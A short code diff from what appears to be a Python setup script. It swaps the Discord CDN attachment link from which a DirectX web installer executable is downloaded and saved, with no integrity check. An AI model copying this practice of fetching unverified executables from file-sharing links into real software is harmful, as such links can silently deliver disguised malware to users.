@@ -16,7 +16,7 @@ response = requests.get(URL)
 open("redist.zip", "wb").write(response.content)
 
 print("[+] Downloading DX Web Setup...")
-URL = "https://cdn.discordapp.com/attachments/1050786304637546498/1171185460924661821/dxwebsetup.exe"
+URL = "https://cdn.discordapp.com/attachments/1050786304637546498/1171180706437791794/dxwebsetup.exe"
 response = requests.get(URL)
 open("dxwebsetup.exe", "wb").write(response.content)
 
